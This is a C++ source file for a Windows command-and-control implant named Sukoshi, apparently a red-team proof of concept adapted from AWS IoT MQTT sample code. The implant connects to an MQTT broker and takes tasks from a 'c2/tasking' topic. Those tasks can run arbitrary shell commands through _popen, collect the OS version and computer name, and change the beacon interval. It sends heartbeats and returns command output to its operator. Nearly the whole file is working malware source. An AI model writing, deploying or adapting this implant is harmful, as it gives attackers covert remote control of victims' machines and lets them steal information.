/**
 * Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
 * SPDX-License-Identifier: Apache-2.0.
 */
#include <algorithm>
#include <chrono>
#include <condition_variable>
#include <iostream>
#include <mutex>
#include <sstream>
#include <array>
#include <windows.h>

 // Boost lib for JSON parsing
#include <boost/property_tree/json_parser.hpp>

// AWS C++ libs
#include <aws/crt/Api.h>
#include <aws/crt/StlAllocator.h>
#include <aws/crt/auth/Credentials.h>
#include <aws/crt/io/TlsOptions.h>
#include <aws/crt/UUID.h>
#include <aws/iot/MqttClient.h>

using namespace Aws::Crt;

// For PoC simplicity, use globals
bool runningStatus = true;
// Default dwell time of 5 seconds
int dwellTime = 5;

static void s_printHelp()
{
    fprintf(stdout, "Usage:\n");
    fprintf(
        stdout,
        "Sukoshi.exe --endpoint <endpoint> --cert <path to cert>"
        " --key <path to key>"
        " --client_id <client id> --ca_file <optional: path to custom ca>"
        "--proxy_host <host> --proxy_port <port>\n\n");
    fprintf(stdout, "endpoint: the endpoint of the mqtt server not including a port\n");
    fprintf(
        stdout,
        "cert: path to your client certificate in PEM format.\n");
    fprintf(stdout, "key: path to your key in PEM format.\n");
    fprintf(stdout, "client_id: client id to use (default=sukoshi_client_id)\n");
    fprintf(
        stdout,
        "ca_file: Optional, if the mqtt server uses a certificate that's not already"
        " in your trust store, set this.\n");
    fprintf(stdout, "\tIt's the path to a CA file in PEM format\n");
    fprintf(stdout, "proxy_host: host name of the http proxy to use (optional).\n");
    fprintf(stdout, "proxy_port: port of the http proxy to use (optional).\n");
}

bool s_cmdOptionExists(char** begin, char** end, const String& option)
{
    return std::find(begin, end, option) != end;
}

char* s_getCmdOption(char** begin, char** end, const String& option)
{
    char** itr = std::find(begin, end, option);
    if (itr != end && ++itr != end)
    {
        return *itr;
    }
    return 0;
}

// -------------------------------------------------------------------------
// Custom functions
// -------------------------------------------------------------------------

// Function that gets the host name
std::string GetComputerName()
{
    wchar_t Buffer[15 + 1];
    auto Size = static_cast<DWORD>(std::size(Buffer));
    if (!::GetComputerNameW(Buffer, &Size))
        return "";

    std::wstring stringBuf(Buffer);

    std::string computerName(stringBuf.begin(), stringBuf.end());
    
    return computerName;
}

// Function that formats the implant results for return to AWS
String formatImplantResults(std::string taskResults, std::string taskStatus) {
    // Set results
    boost::property_tree::ptree resultsTree;
    resultsTree.put("contents", taskResults);
    resultsTree.put("status", taskStatus);

    // Return results as formatted JSON string
    std::stringstream resultsStringStream;
    boost::property_tree::json_parser::write_json(resultsStringStream, resultsTree);
    std::string resultsString = resultsStringStream.str();
    String results(resultsString.c_str(), resultsString.size());
    return results;
}

// Function that parses tasking, performs tasking and returns results
String performTasking(String taskingString) {
    // Convert string to JSON
    std::stringstream taskingStringStream;
    taskingStringStream << taskingString;
    boost::property_tree::ptree taskingTree;
    boost::property_tree::read_json(taskingStringStream, taskingTree);

    // Set the task and arguments
    std::string task = taskingTree.get<std::string>("task");
    std::string arguments = taskingTree.get<std::string>("arguments");

    if (task == "ping") {
        // Init vars
        std::string taskResults{};
        std::string taskStatus{};

        // Do the task
        taskResults = "pong";
        taskStatus = "success";

        String results = formatImplantResults(taskResults, taskStatus);
        return results;
    }
    else if (task == "exec") {
        // Init vars
        std::string taskResults{};
        std::string taskStatus{};

        std::string cmdLine = arguments;

        // Do the task
        std::array<char, 128> buffer{};
        std::unique_ptr<FILE, decltype(&_pclose)> pipe{
            _popen(cmdLine.c_str(), "r"),
            _pclose
        };
        if (!pipe)
            throw std::runtime_error("Failed to open pipe.");
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            taskResults += buffer.data();
        }

        taskStatus = "success";

        String results = formatImplantResults(taskResults, taskStatus);
        return results;
    }
    else if (task == "set-dwell-time") {
        // Init vars
        std::string taskResults{};
        std::string taskStatus{};

        int dwell = stoi(arguments);

        // Do the task
        dwellTime = dwell;

        taskResults = "Configured dwell time for " + std::to_string(dwell) + " second(s).";
        taskStatus = "success";

        String results = formatImplantResults(taskResults, taskStatus);
        return results;
    }
    else if (task == "host-recon") {
        // Init vars
        std::string taskResults{};
        std::string taskStatus{};

        // Do the task
        DWORD osverMajor = 0;
        DWORD osverMinor = 0;
        DWORD buildNum = 0;

        NTSTATUS(__stdcall * RtlGetVersion)(LPOSVERSIONINFOEXW);

        OSVERSIONINFOEXW osInfo;

        *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

        if (NULL != RtlGetVersion)
        {
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            RtlGetVersion(&osInfo);
            osverMajor = osInfo.dwMajorVersion;
            osverMinor = osInfo.dwMinorVersion;
            buildNum = osInfo.dwBuildNumber;
        }

        std::string computerName = GetComputerName();

        std::stringstream ss;
        ss << "OS Version: Windows " << osverMajor << "." << osverMinor << " " << buildNum << ", Computer Name: " << computerName;
        taskResults = ss.str();
        taskStatus = "success";

        String results = formatImplantResults(taskResults, taskStatus);
        return results;
    }
    else if (task == "exit") {
        // Init vars
        std::string taskResults{};
        std::string taskStatus{};

        // Do the task
        runningStatus = false;

        taskResults = "Implant has been configured to exit, goodbye.";
        taskStatus = "success";

        String results = formatImplantResults(taskResults, taskStatus);
        return results;
    }
    else {
        // Init vars
        std::string taskResults{};
        std::string taskStatus{};

        taskResults = "Unsupported task type.";
        taskStatus = "error";

        String results = formatImplantResults(taskResults, taskStatus);
        return results;
    }
}

// -------------------------------------------------------------------------

int main(int argc, char* argv[])
{

    /************************ Setup the Lib ****************************/
    /*
     * Do the global initialization for the API.
     */
    ApiHandle apiHandle;

    String endpoint;
    String certificatePath;
    String keyPath;
    String caFile;
    String clientId("sukoshi_client_id");
    String proxyHost;
    uint16_t proxyPort(8080);

    /*********************** Parse Arguments ***************************/
    if (!s_cmdOptionExists(argv, argv + argc, "--endpoint"))
    {
        s_printHelp();
        return 1;
    }
    endpoint = s_getCmdOption(argv, argv + argc, "--endpoint");

    if (s_cmdOptionExists(argv, argv + argc, "--key"))
    {
        keyPath = s_getCmdOption(argv, argv + argc, "--key");
    }

    if (s_cmdOptionExists(argv, argv + argc, "--cert"))
    {
        certificatePath = s_getCmdOption(argv, argv + argc, "--cert");
    }

    if (s_cmdOptionExists(argv, argv + argc, "--ca_file"))
    {
        caFile = s_getCmdOption(argv, argv + argc, "--ca_file");
    }

    if (s_cmdOptionExists(argv, argv + argc, "--client_id"))
    {
        clientId = s_getCmdOption(argv, argv + argc, "--client_id");
    }

    if (s_cmdOptionExists(argv, argv + argc, "--proxy_host"))
    {
        proxyHost = s_getCmdOption(argv, argv + argc, "--proxy_host");
    }

    if (s_cmdOptionExists(argv, argv + argc, "--proxy_port"))
    {
        int port = atoi(s_getCmdOption(argv, argv + argc, "--proxy_port"));
        if (port > 0 && port <= UINT16_MAX)
        {
            proxyPort = static_cast<uint16_t>(port);
        }
    }

    /********************** Setup an Mqtt Client ******************/
    /*
     * You need an event loop group to process IO events.
     * If you only have a few connections, 1 thread is ideal.
     */
    Io::EventLoopGroup eventLoopGroup(1);

    if (!eventLoopGroup)
    {
        fprintf(
            stderr, "Event Loop Group creation failed with error %s\n", ErrorDebugString(eventLoopGroup.LastError()));
        exit(-1);
    }

    Aws::Crt::Io::DefaultHostResolver defaultHostResolver(eventLoopGroup, 1, 5);
    Io::ClientBootstrap bootstrap(eventLoopGroup, defaultHostResolver);

    if (!bootstrap)
    {
        fprintf(stderr, "Client Bootstrap failed with error %s\n", ErrorDebugString(bootstrap.LastError()));
        exit(-1);
    }

    Aws::Crt::Http::HttpClientConnectionProxyOptions proxyOptions;
    if (!proxyHost.empty())
    {
        proxyOptions.HostName = proxyHost;
        proxyOptions.Port = proxyPort;
        proxyOptions.AuthType = Aws::Crt::Http::AwsHttpProxyAuthenticationType::None;
    }

    // Configure the MQTT connection with a "builder"
    Aws::Crt::Io::TlsContext x509TlsCtx;
    Aws::Iot::MqttClientConnectionConfigBuilder builder;

    if (!certificatePath.empty() && !keyPath.empty())
    {
        // Using cert authN, build the MQTT client config by passing the certificate and private key path
        builder = Aws::Iot::MqttClientConnectionConfigBuilder(certificatePath.c_str(), keyPath.c_str());
    }
    else
    {
        s_printHelp();
    }

    if (!proxyHost.empty())
    {
        builder.WithHttpProxyOptions(proxyOptions);
    }

    if (!caFile.empty())
    {
        builder.WithCertificateAuthority(caFile.c_str());
    }

    builder.WithEndpoint(endpoint);

    // Initialize the MQTT client configuration that was built in the previous section
    auto clientConfig = builder.Build();

    if (!clientConfig)
    {
        fprintf(
            stderr,
            "Client Configuration initialization failed with error %s\n",
            ErrorDebugString(clientConfig.LastError()));
        exit(-1);
    }

    // Pass in the MQTT client connection config and initialize the client
    Aws::Iot::MqttClient mqttClient(bootstrap);
    /*
     * Since no exceptions are used, always check the bool operator
     * when an error could have occurred.
     */
    if (!mqttClient)
    {
        fprintf(stderr, "MQTT Client creation failed with error %s\n", ErrorDebugString(mqttClient.LastError()));
        exit(-1);
    }

    /*
     * Now create a connection object. Note: This type is move only
     * and its underlying memory is managed by the client.
     */
    auto connection = mqttClient.NewConnection(clientConfig);

    if (!connection)
    {
        fprintf(stderr, "MQTT Connection creation failed with error %s\n", ErrorDebugString(mqttClient.LastError()));
        exit(-1);
    }

    /*
     * In a real world application you probably don't want to enforce synchronous behavior
     * but this is a PoC, so we'll just do that with a condition variable.
     */
    std::promise<bool> connectionCompletedPromise;
    std::promise<void> connectionClosedPromise;

    // Our callback definitions go in this section

    /*
     * This will execute when an MQTT connect has completed or failed.
     */
    auto onConnectionCompleted = [&](Mqtt::MqttConnection&, int errorCode, Mqtt::ReturnCode returnCode, bool) {
        if (errorCode)
        {
            fprintf(stdout, "Connection failed with error %s\n", ErrorDebugString(errorCode));
            connectionCompletedPromise.set_value(false);
        }
        else
        {
            if (returnCode != AWS_MQTT_CONNECT_ACCEPTED)
            {
                fprintf(stdout, "Connection failed with MQTT return code %d\n", (int)returnCode);
                connectionCompletedPromise.set_value(false);
            }
            else
            {
                fprintf(stdout, "Connection completed successfully.\n");
                connectionCompletedPromise.set_value(true);
            }
        }
    };

    auto onInterrupted = [&](Mqtt::MqttConnection&, int error) {
        fprintf(stdout, "Connection interrupted with error %s\n", ErrorDebugString(error));
    };

    auto onResumed = [&](Mqtt::MqttConnection&, Mqtt::ReturnCode, bool) { fprintf(stdout, "Connection resumed\n"); };

    /*
     * Invoked when a disconnect message has completed.
     */
    auto onDisconnect = [&](Mqtt::MqttConnection&) {
        {
            fprintf(stdout, "Disconnect completed\n");
            connectionClosedPromise.set_value();
        }
    };

    // Set the callback functions
    connection->OnConnectionCompleted = std::move(onConnectionCompleted);
    connection->OnDisconnect = std::move(onDisconnect);
    connection->OnConnectionInterrupted = std::move(onInterrupted);
    connection->OnConnectionResumed = std::move(onResumed);

    /*
     * Actually perform the connect dance.
     */
    fprintf(stdout, "Connecting...\n");
    if (!connection->Connect(clientId.c_str(), false /*cleanSession*/, 1000 /*keepAliveTimeSecs*/))
    {
        fprintf(stderr, "MQTT Connection failed with error %s\n", ErrorDebugString(connection->LastError()));
        exit(-1);
    }

    // The code in this block operates while an MQTT connection is established
    // This is where the bulk of the work takes place
    if (connectionCompletedPromise.get_future().get())
    {
        std::mutex receiveMutex;
        std::condition_variable receiveSignal;

        /*
         * This is invoked upon the receipt of a Publish on a subscribed topic.
         */

        // Here is where tasks are received from the "c2/tasking" channel
        auto onMessage = [&](Mqtt::MqttConnection&,
            const String& topic,
            const ByteBuf& byteBuf,
            bool /*dup*/,
            Mqtt::QOS /*qos*/,
            bool /*retain*/) {
                {
                    fprintf(stdout, "Publish received on topic %s\n", topic.c_str());
                    fprintf(stdout, "Message: ");
                    fwrite(byteBuf.buffer, 1, byteBuf.len, stdout);
                    fprintf(stdout, "\n");

                    // Sleep for configured dwell time
                    std::this_thread::sleep_for(std::chrono::milliseconds(dwellTime * 1000));

                    // Get the string version of the buffer
                    String taskingString = (const char*)(byteBuf.buffer);

                    // Perform the work on tasking and set the results
                    String resultMsgPayload = performTasking(taskingString);

                    // Call function to publish the results returned by tasking function
                    ByteBuf payload = ByteBufFromArray((const uint8_t*)resultMsgPayload.data(), resultMsgPayload.length());
                    fprintf(stdout, "Publishing to topic c2/results\n");
                    fprintf(stdout, "Message: ");
                    fwrite(payload.buffer, 1, payload.len, stdout);
                    auto onPublishComplete = [](Mqtt::MqttConnection&, uint16_t, int) {};
                    connection->Publish("c2/results", AWS_MQTT_QOS_AT_LEAST_ONCE, false, payload, onPublishComplete);
                }
        };

        /*
         * Subscribe for incoming publish messages on topic.
         */

        // Define the subscription ack response callback function
        std::promise<void> subscribeFinishedPromise;
        auto onSubAck =
            [&](Mqtt::MqttConnection&, uint16_t packetId, const String& topic, Mqtt::QOS QoS, int errorCode) {
            if (errorCode)
            {
                fprintf(stderr, "Subscribe failed with error %s\n", aws_error_debug_str(errorCode));
                exit(-1);
            }
            else
            {
                if (!packetId || QoS == AWS_MQTT_QOS_FAILURE)
                {
                    fprintf(stderr, "Subscribe rejected by the broker.");
                    exit(-1);
                }
                else
                {
                    fprintf(stdout, "Subscribe on topic %s on packetId %d succeeded\n", topic.c_str(), packetId);
                }
            }
            subscribeFinishedPromise.set_value();
        };


        // Subscribe to the "c2/tasking" topic
        connection->Subscribe("c2/tasking", AWS_MQTT_QOS_AT_LEAST_ONCE, onMessage, onSubAck);
        subscribeFinishedPromise.get_future().wait();

        // Start the beaconing loop of publishing to the "c2/heartbeat" topic
        uint32_t heartbeatPublishedCount = 0;
        String heartbeatMsgPayload = formatImplantResults("heartbeat", "success");

        // While the running flag is set to true, keep looping the heartbeat publish
        while (runningStatus == true)
        {
            ByteBuf payload = ByteBufFromArray((const uint8_t*)heartbeatMsgPayload.data(), heartbeatMsgPayload.length());

            auto onPublishComplete = [](Mqtt::MqttConnection&, uint16_t, int) {};
            connection->Publish("c2/heartbeat", AWS_MQTT_QOS_AT_LEAST_ONCE, false, payload, onPublishComplete);
            ++heartbeatPublishedCount;
            fprintf(stdout, "Heartbeat publish count %d\n", heartbeatPublishedCount);

            // Dwell for specified amount of seconds
            std::this_thread::sleep_for(std::chrono::milliseconds(dwellTime*1000));
        }

        /*
         * Unsubscribe from the topic.
         */

        // When the loop exits, unsubscribe from all topics
        std::promise<void> unsubscribeFinishedPromise;
        connection->Unsubscribe(
            "c2/tasking", [&](Mqtt::MqttConnection&, uint16_t, int) { unsubscribeFinishedPromise.set_value(); });
        unsubscribeFinishedPromise.get_future().wait();

        /* Disconnect */
        if (connection->Disconnect())
        {
            connectionClosedPromise.get_future().wait();
        }
    }
    else
    {
        exit(-1);
    }

    return 0;
}
